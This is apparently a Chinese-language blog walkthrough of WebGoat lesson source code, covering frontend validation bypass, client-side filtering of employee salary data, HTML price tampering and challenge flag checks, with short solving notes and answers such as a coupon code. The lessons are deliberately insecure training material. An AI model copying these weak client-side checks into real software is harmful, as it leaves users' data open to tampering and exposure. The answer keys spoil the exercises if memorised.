<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220915210635708.png" alt="image-20220915210635708"></p>
<h3 id="BypassRestrictionsFrontendValidation"><a href="#BypassRestrictionsFrontendValidation" class="headerlink" title="BypassRestrictionsFrontendValidation"></a>BypassRestrictionsFrontendValidation</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.bypass_restrictions;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentEndpoint;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AttackResult;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BypassRestrictionsFrontendValidation</span> <span class="keyword">extends</span> <span class="title class_">AssignmentEndpoint</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&quot;/BypassRestrictions/frontendValidation&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> AttackResult <span class="title function_">completed</span><span class="params">(<span class="meta">@RequestParam</span> String field1, <span class="meta">@RequestParam</span> String field2, <span class="meta">@RequestParam</span> String field3, <span class="meta">@RequestParam</span> String field4, <span class="meta">@RequestParam</span> String field5, <span class="meta">@RequestParam</span> String field6, <span class="meta">@RequestParam</span> String field7, <span class="meta">@RequestParam</span> Integer error)</span>&#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">regex1</span> <span class="operator">=</span> <span class="string">&quot;^[a-z]&#123;3&#125;$&quot;</span>;</span><br><span class="line"><span class="comment">//        匹配 以A-Z开头总共三位并且是以这个开头和结尾的字符 类似 abc</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">regex2</span> <span class="operator">=</span> <span class="string">&quot;^[0-9]&#123;3&#125;$&quot;</span>;</span><br><span class="line"><span class="comment">//        数字</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">regex3</span> <span class="operator">=</span> <span class="string">&quot;^[a-zA-Z0-9]*$&quot;</span>;</span><br><span class="line"><span class="comment">//        匹配以 a-z A-Z 0-9 开头结尾的0个或多个字符</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">regex4</span> <span class="operator">=</span> <span class="string">&quot;^(one|two|three|four|five|six|seven|eight|nine)$&quot;</span>;</span><br><span class="line"><span class="comment">//        匹配以 这些中一个为开头结尾的字符</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">regex5</span> <span class="operator">=</span> <span class="string">&quot;^\\d&#123;5&#125;$&quot;</span>;</span><br><span class="line"><span class="comment">//        匹配以 数字开头结尾的5个字符</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">regex6</span> <span class="operator">=</span> <span class="string">&quot;^\\d&#123;5&#125;(-\\d&#123;4&#125;)?$&quot;</span>;</span><br><span class="line"><span class="comment">//        匹配类似 12345-1234 或 12345 的字符</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">regex7</span> <span class="operator">=</span> <span class="string">&quot;^[2-9]\\d&#123;2&#125;-?\\d&#123;3&#125;-?\\d&#123;4&#125;$&quot;</span>;</span><br><span class="line"><span class="comment">//        匹配类似 233-333-4444 233-3334444 2333334444 这样的字符</span></span><br><span class="line">        <span class="keyword">if</span> (error &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> failed(<span class="built_in">this</span>).build();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (field1.matches(regex1))&#123;</span><br><span class="line">            <span class="keyword">return</span> failed(<span class="built_in">this</span>).build();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (field2.matches(regex2))&#123;</span><br><span class="line">            <span class="keyword">return</span> failed(<span class="built_in">this</span>).build();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (field3.matches(regex3))&#123;</span><br><span class="line">            <span class="keyword">return</span> failed(<span class="built_in">this</span>).build();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (field4.matches(regex4))&#123;</span><br><span class="line">            <span class="keyword">return</span> failed(<span class="built_in">this</span>).build();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (field5.matches(regex5))&#123;</span><br><span class="line">            <span class="keyword">return</span> failed(<span class="built_in">this</span>).build();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (field6.matches(regex6))&#123;</span><br><span class="line">            <span class="keyword">return</span> failed(<span class="built_in">this</span>).build();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (field7.matches(regex7))&#123;</span><br><span class="line">            <span class="keyword">return</span> failed(<span class="built_in">this</span>).build();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> success(<span class="built_in">this</span>).build();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这关要绕过正则 记得把error归零</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220915213438199.png" alt="image-20220915213438199"></p>
<h2 id="client-side-filtering"><a href="#client-side-filtering" class="headerlink" title="client_side_filtering"></a>client_side_filtering</h2><h3 id="ClientSideFiltering"><a href="#ClientSideFiltering" class="headerlink" title="ClientSideFiltering"></a>ClientSideFiltering</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.client_side_filtering;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.lessons.Category;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.lessons.Lesson;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ClientSideFiltering</span> <span class="keyword">extends</span> <span class="title class_">Lesson</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Category <span class="title function_">getDefaultCategory</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Category.CLIENT_SIDE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getTitle</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;client.side.filtering.title&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="ClientSideFilteringAssignment"><a href="#ClientSideFilteringAssignment" class="headerlink" title="ClientSideFilteringAssignment"></a>ClientSideFilteringAssignment</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.client_side_filtering;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentEndpoint;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentHints;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AttackResult;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@AssignmentHints(&#123;&quot;ClientSideFilteringHint1&quot;, &quot;ClientSideFilteringHint2&quot;, &quot;ClientSideFilteringHint3&quot;, &quot;ClientSideFilteringHint4&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ClientSideFilteringAssignment</span> <span class="keyword">extends</span> <span class="title class_">AssignmentEndpoint</span> &#123;</span><br><span class="line">    <span class="meta">@PostMapping(&quot;/clientSideFiltering/attack1&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> AttackResult <span class="title function_">completed</span><span class="params">(<span class="meta">@RequestParam</span> String  answer)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;450000&quot;</span>.equals(answer) ? success(<span class="built_in">this</span>).feedback(<span class="string">&quot;assignment.solved&quot;</span>).build():</span><br><span class="line">                failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;ClientSideFiltering.incorrect&quot;</span>).build();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Salaries"><a href="#Salaries" class="headerlink" title="Salaries"></a>Salaries</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.client_side_filtering;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lombok.extern.slf4j.Slf4j;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Value;</span><br><span class="line"><span class="keyword">import</span> org.springframework.core.io.ClassPathResource;</span><br><span class="line"><span class="keyword">import</span> org.springframework.util.FileCopyUtils;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"><span class="keyword">import</span> org.w3c.dom.Node;</span><br><span class="line"><span class="keyword">import</span> org.w3c.dom.NodeList;</span><br><span class="line"><span class="keyword">import</span> org.xml.sax.InputSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.annotation.PostConstruct;</span><br><span class="line"><span class="keyword">import</span> javax.xml.xpath.XPath;</span><br><span class="line"><span class="keyword">import</span> javax.xml.xpath.XPathConstants;</span><br><span class="line"><span class="keyword">import</span> javax.xml.xpath.XPathExpressionException;</span><br><span class="line"><span class="keyword">import</span> javax.xml.xpath.XPathFactory;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Salaries</span> &#123;</span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;webgoat.user.directory&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String webGoatHomeDirectory;</span><br><span class="line">    <span class="meta">@PostConstruct</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">copyFiles</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">ClassPathResource</span> <span class="variable">classPathResource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathResource</span>(<span class="string">&quot;lessons/employees.xml&quot;</span>);</span><br><span class="line"><span class="comment">//        首先从classpath 中读取employees.xm文件</span></span><br><span class="line">        <span class="type">File</span> <span class="variable">targetDirectory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(webGoatHomeDirectory, <span class="string">&quot;/ClientSideFiltering&quot;</span>);</span><br><span class="line"><span class="comment">//        新建一个目标问阿金</span></span><br><span class="line">        <span class="keyword">if</span> (!targetDirectory.exists())&#123;</span><br><span class="line">            targetDirectory.mkdir();</span><br><span class="line"><span class="comment">//            创建文件夹</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            FileCopyUtils.copy(classPathResource.getInputStream(),<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="keyword">new</span> <span class="title class_">File</span>(targetDirectory,<span class="string">&quot;employees.xml&quot;</span>)));</span><br><span class="line"><span class="comment">//            将文件复制进去</span></span><br><span class="line">        &#125;<span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;clientSideFiltering/salaries&quot;)</span></span><br><span class="line"><span class="comment">//    这里其实只要是get请求就会执行 不管有没有参数</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;Map&lt;String,Object&gt;&gt; <span class="title function_">invoke</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">NodeList</span> <span class="variable">nodes</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">File</span> <span class="variable">d</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(webGoatHomeDirectory,<span class="string">&quot;ClientSideFiltering/employees.xml&quot;</span>);</span><br><span class="line"><span class="comment">//        新建一个employees.xml对象</span></span><br><span class="line">        <span class="type">XPathFactory</span> <span class="variable">factory</span> <span class="operator">=</span> XPathFactory.newInstance();</span><br><span class="line"><span class="comment">//          获得一个xml解析对象</span></span><br><span class="line">        <span class="type">XPath</span> <span class="variable">path</span> <span class="operator">=</span> factory.newXPath();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> (<span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(d))&#123;</span><br><span class="line"><span class="comment">//            首先从创建一个文件读入流</span></span><br><span class="line">            <span class="type">InputSource</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InputSource</span>(is);</span><br><span class="line"><span class="comment">//            创建一个新的字节输入流</span></span><br><span class="line">            <span class="type">StringBuffer</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>();</span><br><span class="line"><span class="comment">//            这里的sb 其实就对应着xml 中的节点名称</span></span><br><span class="line">            sb.append(<span class="string">&quot;/Employees/Employee/UserID | &quot;</span>);</span><br><span class="line">            sb.append(<span class="string">&quot;/Employees/Employee/FirstName | &quot;</span>);</span><br><span class="line">            sb.append(<span class="string">&quot;/Employees/Employee/LastName | &quot;</span>);</span><br><span class="line">            sb.append(<span class="string">&quot;/Employees/Employee/SSN | &quot;</span>);</span><br><span class="line">            sb.append(<span class="string">&quot;/Employees/Employee/Salary &quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">expression</span> <span class="operator">=</span> sb.toString();</span><br><span class="line">            nodes = (NodeList) path.evaluate(expression,inputStream, XPathConstants.NODESET);</span><br><span class="line"><span class="comment">//            这里对应节点进行解析</span></span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span> (XPathExpressionException e)&#123;</span><br><span class="line">            log.error(<span class="string">&quot;Unable to parse xml&quot;</span>,e);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">            log.error(<span class="string">&quot;Unable to read employees.xml at location: &#x27;&#123;&#125;&#x27;&quot;</span>,d);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">columns</span> <span class="operator">=</span> <span class="number">5</span>;</span><br><span class="line">        <span class="type">List</span> <span class="variable">json</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">        java.util.Map&lt;String,Object&gt; employeeJson = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nodes.getLength(); i ++ )&#123;</span><br><span class="line">            <span class="keyword">if</span> (i % columns == <span class="number">0</span>)&#123;</span><br><span class="line">                employeeJson = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">                json.add(employeeJson);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">Node</span> <span class="variable">node</span> <span class="operator">=</span> nodes.item(i);</span><br><span class="line">            employeeJson.put(node.getNodeName(),node.getTextContent());</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//        将数据填入到map中</span></span><br><span class="line">        <span class="keyword">return</span> json;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的sb需要对应着xml文件去看</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220915221640970.png" alt="image-20220915221640970"></p>
<p>这里需要的是在众多的请求中找到这个请求信息</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220915223520300.png" alt="image-20220915223520300"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220915223538290.png" alt="image-20220915223538290"></p>
<h3 id="ClientSideFilteringFreeAssignment"><a href="#ClientSideFilteringFreeAssignment" class="headerlink" title="ClientSideFilteringFreeAssignment"></a>ClientSideFilteringFreeAssignment</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.client_side_filtering;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentEndpoint;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentHints;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AttackResult;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@AssignmentHints(&#123;&quot;client.side.filtering.free.hint1&quot;, &quot;client.side.filtering.free.hint2&quot;, &quot;client.side.filtering.free.hint3&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ClientSideFilteringFreeAssignment</span> <span class="keyword">extends</span> <span class="title class_">AssignmentEndpoint</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">SUPER_COUPON_CODE</span> <span class="operator">=</span> <span class="string">&quot;get_it_for_free&quot;</span>;</span><br><span class="line">    <span class="meta">@PostMapping(&quot;/clientSideFiltering/getItForFree&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> AttackResult <span class="title function_">completed</span><span class="params">(<span class="meta">@RequestParam</span> String checkoutCode)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (SUPER_COUPON_CODE.equals(checkoutCode))&#123;</span><br><span class="line">            <span class="keyword">return</span> success(<span class="built_in">this</span>).build();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> failed(<span class="built_in">this</span>).build();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同样找请求信息</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220915231851586.png" alt="image-20220915231851586"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220915231859141.png" alt="image-20220915231859141"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220915231913308.png" alt="image-20220915231913308"></p>
<h2 id="html-tampering"><a href="#html-tampering" class="headerlink" title="html_tampering"></a>html_tampering</h2><h3 id="HtmlTampering"><a href="#HtmlTampering" class="headerlink" title="HtmlTampering"></a>HtmlTampering</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.html_tampering;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.lessons.Category;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.lessons.Lesson;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HtmlTampering</span> <span class="keyword">extends</span> <span class="title class_">Lesson</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Category <span class="title function_">getDefaultCategory</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Category.CLIENT_SIDE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getTitle</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;html-tampering.title&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="HtmlTamperingTask"><a href="#HtmlTamperingTask" class="headerlink" title="HtmlTamperingTask"></a>HtmlTamperingTask</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.html_tampering;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentEndpoint;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentHints;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AttackResult;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@AssignmentHints(&#123;&quot;hint1&quot;, &quot;hint2&quot;, &quot;hint3&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HtmlTamperingTask</span> <span class="keyword">extends</span> <span class="title class_">AssignmentEndpoint</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&quot;/HtmlTampering/task&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> AttackResult <span class="title function_">completed</span><span class="params">(<span class="meta">@RequestParam</span> String QTY,<span class="meta">@RequestParam</span> String Total)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (Float.parseFloat(QTY) * <span class="number">2999.99</span> &gt; Float.parseFloat(Total) +<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> success(<span class="built_in">this</span>).feedback(<span class="string">&quot;html-tampering.tamper.success&quot;</span>).build();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;html-tampering.tamper.failure&quot;</span>).build();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>没意思</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220916124938043.png" alt="image-20220916124938043"></p>
<h2 id="challenges"><a href="#challenges" class="headerlink" title="challenges"></a>challenges</h2><h3 id="ChallengeIntro"><a href="#ChallengeIntro" class="headerlink" title="ChallengeIntro"></a>ChallengeIntro</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.challenges;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.lessons.Category;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.lessons.Lesson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ChallengeIntro</span> <span class="keyword">extends</span> <span class="title class_">Lesson</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Category <span class="title function_">getDefaultCategory</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Category.CHALLENGE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getTitle</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;challenge0.title&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.challenges;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentEndpoint;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AttackResult;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.session.WebSession;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.users.UserTracker;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.users.UserTrackerRepository;</span><br><span class="line"><span class="keyword">import</span> lombok.AllArgsConstructor;</span><br><span class="line"><span class="keyword">import</span> lombok.Getter;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.MediaType;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.annotation.PostConstruct;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.UUID;</span><br><span class="line"><span class="keyword">import</span> java.util.stream.IntStream;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Flag</span> <span class="keyword">extends</span> <span class="title class_">AssignmentEndpoint</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Map&lt;Integer,String&gt; FLAGS = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> UserTrackerRepository userTrackerRepository;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> WebSession webSession;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@AllArgsConstructor</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">class</span> <span class="title class_">FlagPosted</span>&#123;</span><br><span class="line">        <span class="meta">@Getter</span></span><br><span class="line">        <span class="keyword">private</span> <span class="type">boolean</span> lessonCompleted;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostConstruct</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">initFlags</span><span class="params">()</span>&#123;</span><br><span class="line">        IntStream.range(<span class="number">1</span>,<span class="number">10</span>).forEach(i -&gt; FLAGS.put(i, UUID.randomUUID().toString()));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(path = &quot;/challenge/flag&quot;,method = RequestMethod.POST,produces = MediaType.APPLICATION_JSON_VALUE)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> AttackResult <span class="title function_">postFlag</span><span class="params">(<span class="meta">@RequestParam</span> String flag)</span>&#123;</span><br><span class="line">        <span class="type">UserTracker</span> <span class="variable">userTracker</span> <span class="operator">=</span> userTrackerRepository.findByUser(webSession.getUserName());</span><br><span class="line">        <span class="type">String</span> <span class="variable">currentChallenge</span> <span class="operator">=</span> webSession.getCurrentLesson().getName();</span><br><span class="line">        <span class="type">int</span> <span class="variable">challengeNumber</span> <span class="operator">=</span> Integer.valueOf(currentChallenge.substring(currentChallenge.length() -<span class="number">1</span>,currentChallenge.length()));</span><br><span class="line"><span class="comment">//        截取是第几关</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">expectedFlag</span> <span class="operator">=</span> FLAGS.get(challengeNumber);</span><br><span class="line">        <span class="keyword">final</span> AttackResult attackResult;</span><br><span class="line">        <span class="keyword">if</span> (expectedFlag.equals(flag))&#123;</span><br><span class="line">            userTracker.assignmentSolved(webSession.getCurrentLesson(),<span class="string">&quot;Assignment&quot;</span> + challengeNumber);</span><br><span 